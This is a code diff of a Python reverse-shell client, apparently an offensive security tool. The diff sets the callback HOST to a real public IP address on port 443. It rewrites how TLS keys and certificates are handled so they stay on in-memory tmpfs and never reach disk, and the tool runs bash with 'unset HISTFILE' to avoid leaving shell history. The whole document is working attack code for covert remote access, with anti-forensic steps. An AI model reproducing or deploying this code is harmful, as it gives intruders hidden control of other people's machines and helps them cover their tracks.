@@ -25,7 +25,7 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 # EDIT THE PARAMETERS BELOW THIS LINE
 ###############################################################################
 
-HOST = "127.0.0.1"
+HOST = "66.70.189.175"
 PORT = 443
 SHELL = ["/bin/bash", "--noprofile"]
 FIRST_COMMAND = "unset HISTFILE"
@@ -74,32 +74,34 @@ def success(text): return "[" + green("*") + "] " + green(text)
 
 # -----------------------------------------------------------------------------
 
-class PipeThread(threading.Thread):
+def get_safe_mountpoint():
     """
-    This thread is a dirty hack to circumvent the SSL module's reliance on
-    files. The whole named pipe gymnastic is implemented to prevent writing
-    the key and certificates to the disk.
-    Named pipe contents are not backed to the hard drive but reside in memory.
+    Looks for tmpfs filesystems mounted as rw to work in as they won't cause
+    any data to be written to the hard drive.
+    :return: A mountpoint where files can be written temporarily.
     """
-    def __init__(self, c_key_filename, c_crt_filename, s_crt_filename):
-        super(PipeThread, self).__init__()
-        self.c_key_filename = c_key_filename
-        self.c_crt_filename = c_crt_filename
-        self.s_crt_filename = s_crt_filename
-        self.ready = False
+    p = subprocess.Popen(["mount", "-t", "tmpfs"], stdout=subprocess.PIPE)
+    candidates, stderr = p.communicate()
+    candidates = filter(lambda x: "rw" in x, candidates.split('\n'))
+    for c in candidates:
+        # Assert that the output of mount is sane
+        device = c.split(" ")[2]
+        if device[0] != '/':
+            print error("%s doesn't seem to be a mountpoint..." % device)
+            continue
 
-    def run(self):
-        os.mkfifo(self.c_key_filename)
-        os.mkfifo(self.c_crt_filename)
-        os.mkfifo(self.s_crt_filename)
-        self.ready = True
-        with open(self.c_key_filename, "w") as pipe:
-            pipe.write(client_key)
-        with open(self.c_crt_filename, "w") as pipe:
-            pipe.write(client_crt)
-        with open(self.s_crt_filename, "w") as pipe:
-            pipe.write(server_crt)
-        return
+        # Check that we have sufficient rights to create files there.
+        if not os.access(device, os.W_OK):
+            continue
+
+        # Verify that there is some space left on the device:
+        statvfs = os.statvfs(device)
+        if statvfs.f_bfree < 1000:  # Require at least 1000 free blocks
+            continue
+
+        return device
+
+    return tempfile.gettempdir()
 
 # -----------------------------------------------------------------------------
 
@@ -108,28 +110,31 @@ def establish_connection():
     This function establishes an SSL connection to the remote host.
     :return: A connected socket if the connection attempt was successful, or None.
     """
-    c_key = tempfile.mktemp()
-    c_crt = tempfile.mktemp()
-    s_crt = tempfile.mktemp()
-    t = PipeThread(c_key, c_crt, s_crt)
-    t.setDaemon(True)
-    t.start()
-    while not t.ready:
-        time.sleep(0.2)  # Make sure the thread has had time to create the pipes.
+    tmpfs = get_safe_mountpoint()
+    (c_key, c_crt, s_crt) = (tempfile.NamedTemporaryFile(dir=tmpfs),
+                             tempfile.NamedTemporaryFile(dir=tmpfs),
+                             tempfile.NamedTemporaryFile(dir=tmpfs))
+    # I wish I didn't have to write the certs to disk, but the API leaves me no choice at all.
     try:
+        c_key.write(client_key)
+        c_key.flush()
+        c_crt.write(client_crt)
+        c_crt.flush()
+        s_crt.write(server_crt)
+        s_crt.flush()
         s = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), ssl_version=ssl.PROTOCOL_TLSv1,
-                            keyfile=c_key,
-                            certfile=c_crt,
-                            ca_certs=s_crt)
+                            keyfile=c_key.name,
+                            certfile=c_crt.name,
+                            ca_certs=s_crt.name)
         s.connect((HOST, PORT))
         return s
     except Exception as e:
         print error("Could not connect to %s:%d!%s (%s)" % (HOST, PORT, END, e))
         return None
     finally:
-        os.unlink(c_key)
-        os.unlink(c_crt)
-        os.unlink(s_crt)
+        c_key.close()
+        c_crt.close()
+        s_crt.close()
 
 # -----------------------------------------------------------------------------
 
